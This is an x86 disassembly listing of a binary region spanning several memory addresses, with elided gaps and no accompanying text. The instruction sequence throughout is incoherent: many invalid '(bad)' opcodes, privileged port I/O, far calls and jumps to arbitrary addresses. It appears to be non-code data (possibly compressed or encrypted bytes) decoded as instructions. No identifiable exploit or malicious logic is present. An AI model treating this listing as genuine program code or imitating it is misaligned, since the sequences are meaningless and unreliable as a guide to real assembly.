  42cfe1:	les    eax,FWORD PTR [edx-0x68]
  42cfe4:	mov    esp,0x1e2670b
  42cfe9:	add    BYTE PTR [eax],al
  42cfeb:	add    DWORD PTR [eax],eax
  42cfed:	add    BYTE PTR [esi-0x76],ah
  42cff0:	aas    
  42cff1:	push   edx
  42cff2:	jnp    0x42cfd4
  42cff4:	push   es
  42cff5:	rol    ecx,0x90
  42cff8:	jbe    0x42d045
  42cffa:	scas   eax,DWORD PTR es:[edi]
  42cffb:	xchg   edi,eax
  42cffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cffd:	cmp    BYTE PTR [ebx+0x473783b7],0x45
  42d004:	cdq    
  42d005:	adc    al,0xc
  42d007:	xor    al,0x82
  42d009:	sub    al,0x8b
  42d00b:	js     0x42cfb3
  42d00d:	jb     0x42cfd2
  42d00f:	mov    ah,0xf6
  42d011:	xchg   esi,eax
  42d012:	sub    al,0x3b
  42d014:	cmp    eax,0xc1070009
  42d019:	add    eax,DWORD PTR [eax+0x5]
  42d01c:	jb     0x42d084
  42d01e:	xor    DWORD PTR [ebp-0x12],ebp
  42d021:	pop    ss
  42d022:	xchg   esi,eax
  42d023:	pop    ds
  42d024:	mov    dl,0x8c
  42d026:	mov    dl,0xce
  42d028:	push   0x6c
  42d02a:	bound  eax,QWORD PTR [eax-0x7e]
  42d02d:	or     al,0x82
  42d02f:	test   al,0xfd
  42d031:	test   al,0x90
  42d033:	mov    ecx,0xe02bc772
  42d038:	(bad)  
  42d039:	fiadd  WORD PTR [ecx]
  42d03b:	xor    eax,0x470078df
  42d040:	ret    
  42d041:	retf   
  42d042:	(bad)  
  42d043:	ins    DWORD PTR es:[edi],dx
  42d044:	mov    bh,0x31
  42d046:	jb     0x42d001
  42d048:	inc    ecx
  42d049:	idiv   esi
  42d04b:	pop    es
  42d04c:	jae    0x42d0c6
  42d04e:	jae    0x42d03e
  42d050:	cdq    
  42d051:	pop    ebx
  42d052:	and    ah,0x75
  42d055:	jbe    0x42d018
  42d057:	pop    es
  42d058:	fdivr  QWORD PTR [eax+0x6]
  42d05b:	or     esp,ebp
  42d05d:	out    dx,al
  42d05e:	(bad)  
  42d05f:	jl     0x42d0bd
  42d061:	aam    0xb7
  42d063:	retf   0x7c0
  42d066:	(bad)  
  42d067:	repz into 
  42d069:	mov    ds,WORD PTR [eax]
  42d06b:	shl    DWORD PTR [ecx+0x53],cl
  42d06e:	clc    
  42d06f:	test   eax,0xcf4aebfd
  42d074:	mov    ebp,0x6aa419fe
  42d079:	xchg   edx,edx
  42d07b:	jno    0x42d08c
  42d07d:	js     0x42d064
  42d07f:	aas    
  42d080:	ins    BYTE PTR es:[edi],dx
  42d081:	int    0xe
  42d083:	pop    eax
  42d084:	int3   
  42d085:	aas    
  42d086:	ss dec esp
  42d088:	or     BYTE PTR [ecx+0x31811],dl
  42d08e:	hlt    
  42d08f:	push   edx
  42d090:	mov    bh,0xf5
  42d092:	mov    bl,0x5f
  42d094:	jmp    0x359ee904
  42d099:	stos   DWORD PTR es:[edi],eax
  42d09a:	imul   BYTE PTR [ecx]
  42d09c:	shl    DWORD PTR [ecx],0xc1
  42d09f:	(bad)  
  42d0a0:	sbb    DWORD PTR [esp],ebp
  42d0a3:	mov    bl,0xec
  42d0a5:	and    cl,ah
  42d0a7:	mov    dh,0x83
  42d0a9:	and    DWORD PTR [esi-0x6a],ebx
  42d0ac:	inc    ebp
  42d0ad:	dec    edx
  42d0ae:	cmp    BYTE PTR [ecx],al
  42d0b0:	push   ds
  42d0b1:	or     eax,DWORD PTR [ebx]
  42d0b3:	fwait
  42d0b4:	sbb    esp,DWORD PTR [ebp+edi*1+0x21f28b10]
  42d0bb:	jb     0x42d0a1
  42d0bd:	(bad)  
  42d0be:	xor    BYTE PTR [esi+0x57],bh
  42d0c1:	popa   
  42d0c2:	jl     0x42d0e9
  42d0c4:	push   cs
  42d0c5:	sahf   
  42d0c6:	aaa    
  42d0c7:	xor    BYTE PTR [eax-0x2],0xe
  42d0cb:	cmp    eax,0x233d74f
  42d0d0:	fadd   st(7),st
  42d0d2:	sub    bl,BYTE PTR [eax-0x9d8021a]
  42d0d8:	test   al,0x4d
  42d0da:	add    eax,DWORD PTR [esi]
  42d0dc:	bnd ret 0xae96
  42d0e0:	arpl   WORD PTR [eax-0x59078059],di
  42d0e6:	mov    ebx,0x42b3ddf3
  42d0eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d0ec:	das    
  42d0ed:	pop    ebp
	...
  42d156:	push   eax
  42d157:	cmp    al,dh
  42d159:	sub    al,0xee
  42d15b:	cld    
  42d15c:	cli    
  42d15d:	jle    0x42d0f2
  42d15f:	dec    esp
  42d160:	nop
  42d161:	xor    BYTE PTR [edx],ch
  42d163:	rcr    BYTE PTR [edi],0x3a
  42d166:	jcxz   0x42d16a
  42d169:	add    BYTE PTR [eax],al
  42d16b:	add    DWORD PTR [eax],eax
  42d16d:	add    BYTE PTR [ebx],bh
  42d16f:	mov    ch,0xae
  42d171:	sub    al,0x17
  42d173:	mov    dh,0x32
  42d175:	add    edi,edx
  42d177:	ss inc ebx
  42d179:	mov    edx,0xdd2a06f2
  42d17e:	lahf   
  42d17f:	aad    0xee
  42d181:	adc    dl,BYTE PTR [edx]
  42d183:	xchg   esi,eax
  42d184:	pop    edx
  42d185:	int    0xaa
  42d187:	mov    eax,ds:0xacf0523d
  42d18c:	mul    BYTE PTR [ecx-0x6]
  42d18f:	xchg   ecx,eax
  42d190:	sbb    edi,ecx
  42d192:	stc    
  42d193:	sub    ebx,0xffffffd2
  42d196:	jmp    0x5ab98463
  42d19b:	mov    dh,0x13
  42d19d:	and    BYTE PTR [eax-0x7b69b574],cl
  42d1a3:	pop    ebp
  42d1a4:	add    eax,DWORD PTR [esi]
  42d1a6:	inc    ebx
  42d1a7:	jne    0x42d1e1
  42d1a9:	sbb    DWORD PTR [edx],edi
  42d1ab:	loope  0x42d140
  42d1ad:	call   0xf63c:0x47eb2094
  42d1b4:	js     0x42d21c
  42d1b6:	jne    0x42d215
  42d1b8:	sti    
  42d1b9:	xor    DWORD PTR [edx-0x7f],ecx
  42d1bc:	xlat   BYTE PTR ds:[ebx]
  42d1bd:	(bad)  
  42d1bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1c0:	in     eax,0x49
  42d1c2:	in     eax,0xcc
  42d1c4:	mov    bl,0xb1
  42d1c6:	jno    0x42d169
  42d1c8:	(bad)  
  42d1c9:	mov    ch,0x9
  42d1cb:	mov    DWORD PTR [eax+0x72d9bb82],eax
  42d1d1:	pop    esi
  42d1d2:	jge    0x42d240
  42d1d4:	push   ds
  42d1d5:	mov    bl,0x1e
  42d1d7:	sbb    eax,esp
  42d1d9:	inc    ebx
  42d1da:	frstor [edi-0x57caba4b]
  42d1e0:	fdiv   QWORD PTR [eax+0x40]
  42d1e3:	push   es
  42d1e4:	std    
  42d1e5:	add    eax,0x74f6ca2
  42d1ea:	cmp    BYTE PTR [edi+0x4824cf45],0x55
  42d1f1:	jne    0x42d226
  42d1f3:	clc    
  42d1f4:	lahf   
  42d1f5:	ins    DWORD PTR es:[edi],dx
  42d1f6:	adc    ebx,edi
  42d1f8:	cwde   
  42d1f9:	fisttp WORD PTR [eax]
  42d1fb:	je     0x42d255
  42d1fd:	lock jae 0x42d1ec
  42d200:	jge    0x42d1c0
  42d202:	pop    esi
  42d203:	xor    ebx,edi
  42d205:	xchg   esi,eax
  42d206:	mov    edi,0xd3d8be76
  42d20b:	jge    0x42d1b4
  42d20d:	repnz pop esp
  42d20f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d210:	jns    0x42d1f2
  42d212:	or     ebp,DWORD PTR [ebx+0x30]
  42d215:	xor    ebp,DWORD PTR [edi+0x16f38dd]
  42d21b:	and    BYTE PTR [edi+0x43b8152b],bh
  42d221:	cdq    
  42d222:	add    eax,0x18
  42d225:	pop    ecx
  42d226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d227:	les    edi,FWORD PTR [edi-0x6]
  42d22a:	ja     0x42d262
  42d22c:	push   DWORD PTR [edx-0x167be4e4]
  42d232:	adc    al,0xc0
  42d234:	out    0xd8,eax
  42d236:	cdq    
  42d237:	cmp    esi,esp
  42d239:	loopne 0x42d296
  42d23b:	fcmovne st,st(4)
  42d23d:	jb     0x42d234
  42d23f:	xchg   ch,dl
  42d241:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d242:	mov    ecx,0x7e0a450e
  42d247:	pop    ebx
  42d248:	mov    ebp,DWORD PTR [ebx+ecx*8]
  42d24b:	xchg   esp,eax
  42d24c:	fdiv   st(6),st
  42d24e:	push   ecx
  42d24f:	shl    DWORD PTR [ebx-0x20],0xbf
  42d253:	and    dl,BYTE PTR [esi]
  42d255:	pop    ebx
  42d256:	jns    0x42d2c2
  42d258:	inc    esp
  42d259:	push   esi
  42d25a:	clc    
  42d25b:	pop    ds
  42d25c:	cli    
  42d25d:	ins    DWORD PTR es:[edi],dx
  42d25e:	popf   
  42d25f:	not    BYTE PTR [ebx+eax*4+0x29628d3d]
  42d266:	lds    ecx,FWORD PTR [eax]
  42d268:	pushf  
  42d269:	mov    eax,0x52729a1b
	...
  42d2d6:	lea    ecx,[eax]
  42d2d8:	pop    ebp
  42d2d9:	jbe    0x42d2b8
  42d2db:	ja     0x42d28c
  42d2dd:	sti    
  42d2de:	aaa    
  42d2df:	out    0x36,eax
  42d2e1:	ja     0x42d331
  42d2e3:	xor    BYTE PTR [edx+0x1e4674e],bl
  42d2e9:	add    BYTE PTR [eax],al
  42d2eb:	add    DWORD PTR [eax],eax
  42d2ed:	add    BYTE PTR [edi],ch
  42d2ef:	inc    edi
  42d2f0:	sar    ecx,1
  42d2f2:	(bad)  
  42d2f3:	repz sbb bh,ah
  42d2f6:	mov    ah,0x4
  42d2f8:	xchg   esp,eax
  42d2f9:	push   edi
  42d2fa:	cmc    
  42d2fb:	pop    ds
  42d2fc:	inc    esp
  42d2fd:	push   cs
  42d2fe:	push   cs
  42d2ff:	mov    ebx,DWORD PTR [eax+0x2ba7a0dd]
  42d305:	jo     0x42d2f2
  42d307:	pushf  
  42d308:	imul   ebx,DWORD PTR [eax-0x6],0xb6242195
  42d30f:	add    eax,0x1ffd641c
  42d314:	fld    DWORD PTR [eax]
  42d316:	int    0x44
  42d318:	sbb    DWORD PTR [ecx],0xffffff80
  42d31b:	sahf   
  42d31c:	sar    BYTE PTR [edi],0xa7
  42d31f:	adc    al,0x93
  42d321:	out    dx,al
  42d322:	(bad)  
  42d324:	sbb    BYTE PTR [esi+0x58],bl
  42d327:	mov    eax,ds:0x52169072
  42d32c:	dec    ecx
  42d32d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d32e:	lahf   
  42d32f:	je     0x42d300
  42d331:	jne    0x42d37f
  42d333:	leave  
  42d334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d335:	test   esi,ebp
  42d337:	adc    BYTE PTR [edx+ebx*8+0x34560bfa],0xaf
  42d33f:	int    0xb8
  42d341:	mov    DWORD PTR [eax+0x6a0b7adc],ecx
  42d347:	or     DWORD PTR [eiz*4-0x564f521d],edx
  42d34e:	test   ecx,ecx
  42d350:	cmp    al,0xcb
  42d352:	sub    ebx,DWORD PTR [edi]
  42d354:	pop    esp
  42d355:	jp     0x42d2e4
  42d357:	push   ecx
  42d358:	and    DWORD PTR [eax+0x55],edx
  42d35b:	outs   dx,DWORD PTR ds:[esi]
  42d35c:	xor    ch,BYTE PTR [ecx-0x5f]
  42d35f:	jmp    0x42d3d1
  42d361:	sub    esp,DWORD PTR [edi]
  42d363:	lahf   
  42d364:	pusha  
  42d365:	test   BYTE PTR [esi+0x431a8a5a],ah
  42d36b:	push   ebx
  42d36c:	dec    esi
  42d36d:	imul   esp,ebp,0x6d
  42d370:	jmp    0x6dda1de0
  42d375:	sbb    DWORD PTR [esi+0x7b],ecx
  42d378:	outs   dx,DWORD PTR ds:[esi]
  42d379:	adc    dl,BYTE PTR [ebx+ebx*8]
  42d37c:	test   esp,edi
  42d37e:	lea    esi,[ecx+0x3b]
  42d381:	pusha  
  42d382:	clc    
  42d383:	rcr    BYTE PTR [edi],cl
  42d385:	rcl    DWORD PTR [edi+ecx*2+0xa],0x79
  42d38a:	imul   esp,DWORD PTR ds:0x3e75,0x1a7fb851
  42d393:	(bad)  
  42d394:	aad    0x70
  42d396:	and    eax,0xc5321500
  42d39b:	call   0xac93:0xe602b25a
  42d3a2:	clc    
  42d3a3:	mov    ebp,0xbb9cd4ed
  42d3a8:	std    
  42d3a9:	fist   WORD PTR [edx]
  42d3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d3ac:	push   ebp
  42d3ad:	inc    ecx
  42d3ae:	loop   0x42d3ca
  42d3b0:	sub    esi,ebp
  42d3b2:	fistp  DWORD PTR [ebx]
  42d3b4:	mov    BYTE PTR [edx+0x508c3648],al
  42d3ba:	push   esp
  42d3bb:	cld    
  42d3bc:	jnp    0x42d40e
  42d3be:	ins    DWORD PTR es:[edi],dx
  42d3bf:	sbb    DWORD PTR [ecx+0x7d],esi
  42d3c2:	outs   dx,BYTE PTR ds:[esi]
  42d3c3:	push   cs
  42d3c4:	jae    0x42d3a5
  42d3c6:	add    al,0x60
  42d3c8:	test   DWORD PTR [ebp+ecx*2-0x1f],ebp
  42d3cc:	add    bl,ah
  42d3ce:	inc    esp
  42d3cf:	pop    ebp
  42d3d0:	rol    BYTE PTR [ebx-0x5fccee8b],0xf
  42d3d7:	in     eax,0xe3
  42d3d9:	std    
  42d3da:	push   es
  42d3db:	pop    ebp
  42d3dc:	rol    DWORD PTR [edx-0xb09be34],1
  42d3e2:	ins    DWORD PTR es:[edi],dx
  42d3e3:	mov    WORD PTR [ebx-0x25ff6986],?
  42d3e9:	shl    DWORD PTR [ecx],1
  42d3eb:	xor    cl,BYTE PTR [eax+0x21]
	...
  42d456:	ror    esi,0x63
  42d459:	cdq    
  42d45a:	outs   dx,DWORD PTR ds:[esi]
  42d45b:	mov    ebp,0x9459defb
  42d460:	aaa    
  42d461:	pushf  
  42d462:	dec    ebp
  42d463:	jp     0x42d4a7
  42d465:	popa   
  42d466:	addr16 in eax,0x1
  42d469:	add    BYTE PTR [eax],al
  42d46b:	add    DWORD PTR [eax],eax
  42d46d:	add    BYTE PTR [ebp-0x4c],ch
  42d470:	cmp    esp,ecx
  42d472:	lea    ebp,[edx+0x5bfa9516]
  42d478:	push   0xffffff9b
  42d47a:	push   es
  42d47b:	cmp    DWORD PTR [ebp-0x70a11c3a],edi
  42d481:	ret    
  42d482:	jbe    0x42d4af
  42d484:	push   eax
  42d485:	pop    ebx
  42d486:	sahf   
  42d487:	push   esi
  42d488:	retf   0x4827
  42d48b:	scas   al,BYTE PTR es:[edi]
  42d48c:	arpl   WORD PTR [edx],ax
  42d48e:	nop
  42d48f:	xchg   ebp,eax
  42d490:	push   ebp
  42d491:	dec    ecx
  42d492:	in     eax,dx
  42d493:	inc    esi
  42d494:	jg     0x42d4a8
  42d496:	jb     0x42d4b0
  42d498:	or     eax,ebp
  42d49a:	mov    ebx,0x3423d048
  42d49f:	jle    0x42d42f
  42d4a1:	cld    
  42d4a2:	push   ebp
  42d4a3:	stos   BYTE PTR es:[edi],al
  42d4a4:	xor    ebp,0x3586fdc4
  42d4aa:	push   ebp
  42d4ab:	mov    ebx,DWORD PTR ds:0x2dc5b366
  42d4b1:	dec    ecx
  42d4b2:	aaa    
  42d4b3:	adc    ch,BYTE PTR [edx-0x5a3825b4]
  42d4b9:	popf   
  42d4ba:	stos   DWORD PTR es:[edi],eax
  42d4bb:	(bad)  
  42d4bc:	stos   DWORD PTR es:[edi],eax
  42d4bd:	cmp    DWORD PTR [esi-0x75080ae3],0x22d5fd07
  42d4c7:	aam    0x9
  42d4c9:	fldcw  WORD PTR [edi-0x5e5faaf4]
  42d4cf:	and    al,0xe8
  42d4d1:	cli    
  42d4d2:	fsubp  st(1),st
  42d4d4:	pop    eax
  42d4d6:	cmp    BYTE PTR [ecx+0xb054284],al
  42d4dc:	sub    ah,BYTE PTR [esi-0x5847a325]
  42d4e2:	loop   0x42d4e1
  42d4e4:	ficomp DWORD PTR [eax]
  42d4e6:	mov    ds:0xeed9fd1e,al
  42d4eb:	sub    dh,BYTE PTR [edx+0x69]
  42d4ee:	std    
  42d4ef:	out    0x17,eax
  42d4f1:	mov    bx,0xd3f6
  42d4f5:	mov    WORD PTR [edi+edi*8],es
  42d4f8:	in     al,0x80
  42d4fa:	leave  
  42d4fb:	shl    DWORD PTR [ebx-0x31],cl
  42d4fe:	into   
  42d4ff:	call   0x90ae:0xd8a765b6
  42d506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d507:	aad    0x3b
  42d509:	clc    
  42d50a:	and    al,0x3
  42d50c:	cmp    DWORD PTR [edx-0x24],0x7c12f89
  42d513:	jge    0x42d58d
  42d515:	shl    bl,0x2c
  42d518:	xor    BYTE PTR [esi*4+0x2011a5a2],bl
  42d51f:	dec    esi
  42d520:	outs   dx,DWORD PTR ds:[esi]
  42d521:	jns    0x42d595
  42d523:	or     esi,DWORD PTR [ecx]
  42d525:	jmp    0x598f:0xaa6f18fe
  42d52c:	push   es
  42d52d:	cli    
  42d52e:	xchg   edx,eax
  42d52f:	sub    BYTE PTR [ebx-0x4b],bl
  42d532:	xor    ch,ah
  42d534:	fcomp  st(7)
  42d536:	mov    ds:0xab6aa771,al
  42d53b:	inc    edx
  42d53c:	nop
  42d53d:	or     BYTE PTR [eax+0xcc75c39],dh
  42d543:	or     BYTE PTR cs:[edx+eax*2+0x7b],dh
  42d548:	daa    
  42d549:	sub    al,0x29
  42d54b:	xchg   ebx,eax
  42d54c:	test   bl,dh
  42d54e:	push   0x2ad1a2ab
  42d553:	not    al
  42d555:	rcr    ebp,0xdb
  42d558:	push   edx
  42d559:	test   DWORD PTR gs:[eax-0xcddd778],esi
  42d560:	lock or al,0x68
  42d563:	xchg   esi,eax
  42d564:	mov    BYTE PTR [eax+0x5d9ae2f3],dh
  42d56a:	pop    eax
  42d56b:	push   0x363b
	...
  42d5d4:	add    BYTE PTR [eax],al
  42d5d6:	cdq    
  42d5d7:	cmc    
  42d5d8:	adc    BYTE PTR [ebx-0x12],0x77
  42d5dc:	fcos   
  42d5de:	pop    ebp
  42d5df:	mov    ds:0xf36c9ed5,eax
  42d5e5:	sti    
  42d5e6:	addr16 out 0x1,al
  42d5e9:	add    BYTE PTR [eax],al
  42d5eb:	add    DWORD PTR [eax],eax
  42d5ed:	add    dh,bh
  42d5ef:	or     ah,ah
  42d5f1:	loope  0x42d58d
  42d5f3:	xchg   edx,eax
  42d5f4:	lods   al,BYTE PTR ds:[esi]
  42d5f5:	rcr    DWORD PTR [ebx-0x27],1
  42d5f8:	fcom   QWORD PTR [ebp-0x70]
  42d5fb:	xlat   BYTE PTR ds:[ebx]
  42d5fc:	lods   al,BYTE PTR ds:[esi]
  42d5fd:	stos   BYTE PTR es:[edi],al
  42d5fe:	inc    edx
  42d5ff:	sbb    edx,DWORD PTR [ecx-0x22]
  42d602:	ja     0x42d5c6
  42d604:	jne    0x42d596
  42d606:	enter  0x4f2b,0x83
  42d60a:	jo     0x42d639
  42d60c:	ja     0x42d598
  42d60e:	iret   
  42d60f:	pop    eax
  42d610:	ins    DWORD PTR es:[edi],dx
  42d611:	pusha  
  42d612:	popa   
  42d613:	sub    DWORD PTR [esi],ebx
  42d615:	cwde   
  42d616:	inc    ecx
  42d617:	ret    
  42d618:	push   edi
  42d619:	push   edi
  42d61a:	jg     0x42d5c2
  42d61c:	pop    ecx
  42d61d:	push   edi
  42d61e:	dec    edx
  42d61f:	test   DWORD PTR [esp+ecx*2+0x1d],0x22bc512e
  42d627:	xchg   edx,eax
  42d628:	add    DWORD PTR [eax+0xd954248],ebx
  42d62e:	test   eax,0xe1d6776f
  42d633:	pushf  
  42d634:	(bad)  
  42d635:	out    0x16,al
  42d637:	lahf   
  42d638:	cmp    ebx,esi
  42d63a:	ja     0x42d5d8
  42d63c:	fwait
  42d63d:	xor    al,0x6e
  42d63f:	mov    ecx,0x36f93570
  42d644:	test   cl,bh
  42d646:	fisub  WORD PTR ds:0x639f775
  42d64c:	mov    al,0x1f
  42d64e:	or     DWORD PTR [ebx-0x71],0x6a4c2b7e
  42d655:	mov    cl,0xf8
  42d657:	ins    DWORD PTR es:[edi],dx
  42d658:	sub    ah,BYTE PTR [edi]
  42d65a:	inc    esi
  42d65b:	call   FWORD PTR [ecx+0x7f9530d9]
  42d661:	(bad)  
  42d663:	pop    ecx
  42d664:	es cmc 
  42d666:	mov    edx,0x52475861
  42d66b:	lods   eax,DWORD PTR ds:[esi]
  42d66c:	inc    ebx
  42d66d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d66e:	les    edx,FWORD PTR ss:0x3c3f5f1a
  42d675:	dec    ecx
  42d676:	xchg   esi,eax
  42d677:	clc    
  42d678:	jb     0x42d63f
  42d67a:	push   esp
  42d67b:	xchg   ebx,eax
  42d67c:	inc    ebx
  42d67d:	aam    0xf1
  42d67f:	cmp    ebp,ebp
  42d681:	adc    al,0x6
  42d683:	shl    bl,cl
  42d685:	jae    0x42d66f
  42d687:	test   DWORD PTR [ebx],edx
  42d689:	cwde   
  42d68a:	add    esi,DWORD PTR [ebp-0x5f]
  42d68d:	ja     0x42d6e6
  42d68f:	scas   al,BYTE PTR es:[edi]
  42d690:	adc    ebx,esi
  42d692:	jl     0x42d6fd
  42d694:	(bad)  
  42d695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d696:	pop    ebx
  42d697:	jbe    0x42d671
  42d699:	xor    DWORD PTR [eax+0x420f5cc9],0x6cbdedec
  42d6a3:	xor    BYTE PTR [ebx+0x7b8b0d48],ah
  42d6a9:	mov    bh,BYTE PTR [edi-0x7b]
  42d6ac:	add    BYTE PTR [edx+0x53ed0810],dl
  42d6b2:	in     al,dx
  42d6b3:	dec    edx
  42d6b4:	cli    
  42d6b5:	int3   
  42d6b6:	inc    ecx
  42d6b7:	fiadd  DWORD PTR [edi]
  42d6b9:	add    edi,DWORD PTR [esi-0x4e]
  42d6bc:	adc    eax,0xbfa76ebe
  42d6c1:	fstp   QWORD PTR [edi]
  42d6c3:	ins    BYTE PTR es:[edi],dx
  42d6c4:	xor    DWORD PTR [ebx-0x74],0xf2a93b47
  42d6cb:	fistp  WORD PTR ds:0xbf6fbc02
  42d6d1:	mov    dh,0xa7
  42d6d3:	add    al,0xff
  42d6d5:	sbb    ch,BYTE PTR [edi-0x293f02ac]
  42d6db:	jbe    0x42d675
  42d6dd:	xor    al,0xe1
  42d6df:	rol    dh,0xd5
  42d6e2:	and    eax,0xbeed669a
  42d6e7:	xor    DWORD PTR [ebx-0x5ad1477d],ebx
  42d6ed:	mov    eax,0x0
	...
  42d756:	repz add esp,DWORD PTR [eax]
  42d759:	(bad)  
  42d75a:	lock scas eax,DWORD PTR es:[edi]
  42d75c:	(bad)  
  42d75d:	jg     0x42d6e0
  42d75f:	in     al,0x2c
  42d761:	and    al,0x2c
  42d763:	test   eax,0xe7671b73
  42d768:	add    DWORD PTR [eax],eax
  42d76a:	add    BYTE PTR [ecx],al
  42d76c:	add    BYTE PTR [eax],al
  42d76e:	jmp    0x42d70b
  42d770:	test   DWORD PTR [ebp-0x43],ebx
  42d773:	sahf   
  42d774:	and    al,0x49
  42d776:	into   
  42d777:	xor    eax,0x11efd35b
  42d77c:	leave  
  42d77d:	out    dx,eax
  42d77e:	pusha  
  42d77f:	dec    edi
  42d780:	in     al,dx
  42d781:	shl    DWORD PTR ds:0x9eab72a3,cl
  42d787:	inc    ecx
  42d788:	adc    ch,cl
  42d78a:	sub    ebp,DWORD PTR [ebx]
  42d78c:	pop    edi
  42d78d:	dec    esp
  42d78e:	stos   BYTE PTR es:[edi],al
  42d78f:	retf   0x82e1
  42d792:	pusha  
  42d793:	ret    0xd816
  42d796:	sub    esp,ecx
  42d798:	dec    ebx
  42d799:	pop    eax
  42d79a:	popf   
  42d79b:	xchg   edx,esi
  42d79d:	jae    0x42d7d2
  42d79f:	mov    eax,ds:0xfc015a4f
  42d7a4:	pop    esp
  42d7a5:	sub    eax,0x66d54e22
  42d7aa:	(bad)  
  42d7ab:	ret    
  42d7ac:	cdq    
  42d7ad:	add    DWORD PTR [edx],ebx
  42d7af:	sub    al,0x27
  42d7b1:	add    ebp,ebp
  42d7b3:	imul   edx,edx,0xdf9149a1
  42d7b9:	or     cl,BYTE PTR [ecx]
  42d7bb:	xor    eax,0x607b0b38
  42d7c0:	test   BYTE PTR [esi+esi*2-0x415ab8f0],0xae
  42d7c8:	and    ebp,edx
  42d7ca:	and    ebp,DWORD PTR [ebp+0x1856e14b]
  42d7d0:	ds inc edi
  42d7d2:	mov    edi,0x550f3dcd
  42d7d7:	sbb    al,0xe2
  42d7d9:	icebp  
  42d7da:	mov    edi,0xcbf7e479
  42d7df:	mov    esi,0xb4eb9517
  42d7e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d7e5:	push   ebp
  42d7e6:	pop    eax
  42d7e7:	jae    0x42d819
  42d7e9:	pop    ecx
  42d7ea:	adc    BYTE PTR [edx+edx*8],dh
  42d7ed:	and    DWORD PTR [esi+0x22],esi
  42d7f0:	mov    ds,WORD PTR [edi]
  42d7f2:	mov    esp,esp
  42d7f4:	stos   DWORD PTR es:[edi],eax
  42d7f5:	imul   BYTE PTR ds:0xda6bf4c5
  42d7fb:	jp     0x42d848
  42d7fd:	sub    dl,ch
  42d7ff:	dec    esi
  42d800:	icebp  
  42d801:	(bad)  [edx]
  42d803:	(bad)  
  42d804:	sub    eax,0xe1e3bcc1
  42d809:	mov    bh,0x9d
  42d80b:	inc    edi
  42d80c:	in     eax,0x83
  42d80e:	sub    esp,DWORD PTR [edx+edx*4-0x5a]
  42d812:	inc    esi
  42d813:	cmp    esi,ebx
  42d815:	sub    al,ah
  42d817:	mov    ch,BYTE PTR [eax-0x7782f596]
  42d81d:	cdq    
  42d81e:	rcr    BYTE PTR [edx+0x4f],1
  42d821:	loope  0x42d817
  42d823:	inc    eax
  42d824:	sbb    BYTE PTR [edi-0x3a],al
  42d827:	in     al,0x13
  42d829:	pop    edx
  42d82a:	mov    eax,0xadad335f
  42d82f:	or     ecx,ecx
  42d831:	test   BYTE PTR [ebx-0x32],ch
  42d834:	push   es
  42d835:	imul   eax,DWORD PTR [ebp+0x6f],0x7f
  42d839:	and    al,0x3f
  42d83b:	xchg   ecx,eax
  42d83c:	push   ss
  42d83d:	mov    ebp,0x22d67258
  42d842:	ja     0x42d89e
  42d844:	push   edi
  42d845:	lods   al,BYTE PTR ds:[esi]
  42d846:	xor    ch,al
  42d848:	jb     0x42d89e
  42d84a:	jg     0x42d8ad
  42d84c:	and    BYTE PTR [ebp+0x6c21163e],bl
  42d852:	mov    ecx,0x884ec9c
  42d857:	mov    cl,0x16
  42d859:	sbb    BYTE PTR [edi-0x3851f5f5],cl
  42d85f:	mov    ds:0x2a3dc677,eax
  42d864:	pop    edi
  42d865:	cmp    DWORD PTR [eax+0x79],esi
  42d868:	(bad)
  42d86c:	rcl    DWORD PTR [eax+eax*1+0x0],cl
	...
  42d8d3:	add    BYTE PTR [eax],al
  42d8d5:	add    BYTE PTR [esi-0x62a06765],dl
  42d8db:	pop    edi
  42d8dc:	xlat   BYTE PTR ds:[ebx]
  42d8dd:	fistp  DWORD PTR ds:0xf2c6961a
  42d8e3:	out    0x7a,al
  42d8e5:	add    esp,DWORD PTR [edi-0x18]
  42d8e8:	add    DWORD PTR [eax],eax
  42d8ea:	add    BYTE PTR [ecx],al
  42d8ec:	add    BYTE PTR [eax],al
  42d8ee:	push   ds
  42d8ef:	mov    ebp,0xab0f6be3
  42d8f4:	push   DWORD PTR [esi-0x5f]
  42d8f7:	jg     0x42d8e5
  42d8f9:	dec    ecx
  42d8fa:	sbb    al,0x1f
  42d8fc:	adc    DWORD PTR [eax+0x659aff3c],esp
  42d902:	dec    edx
  42d903:	inc    ecx
  42d904:	ror    BYTE PTR [ecx],0x51
  42d907:	daa    
  42d908:	xor    BYTE PTR [ebp-0x68],dh
  42d90b:	aas    
  42d90c:	xchg   ecx,eax
  42d90d:	or     ecx,edi
  42d90f:	dec    edi
  42d910:	adc    BYTE PTR [ecx+edx*4],dl
  42d913:	out    0x8,eax
  42d915:	std    
  42d916:	dec    ecx
  42d917:	pop    eax
  42d918:	sub    DWORD PTR [edx+0x6a361d6d],ecx
  42d91e:	cmp    dh,dl
  42d920:	and    al,BYTE PTR [eax]
  42d922:	pop    ebp
  42d923:	dec    esp
  42d924:	lahf   
  42d925:	lock pop ebx
  42d927:	adc    DWORD PTR ds:0x48e7a475,ecx
  42d92d:	sbb    al,0x18
  42d92f:	sub    DWORD PTR [eax],ebx
  42d931:	cmp    al,0x1b
  42d933:	into   
  42d934:	pop    ss
  42d935:	loop   0x42d91d
  42d937:	add    eax,0x567bba96
  42d93c:	icebp  
  42d93d:	in     al,0x6
  42d93f:	inc    esi
  42d940:	adc    dl,BYTE PTR [ecx+edi*8-0x5ba1ad2f]
  42d947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d948:	div    BYTE PTR cs:[edx]
  42d94b:	cs dec ebx
  42d94d:	cmp    cl,bh
  42d94f:	scas   al,BYTE PTR es:[edi]
  42d950:	pop    ss
  42d951:	add    ebp,DWORD PTR [eax]
  42d953:	sbb    edx,DWORD PTR [edi+esi*1]
  42d956:	push   ss
  42d957:	adc    BYTE PTR [ebp-0x51535c7f],cl
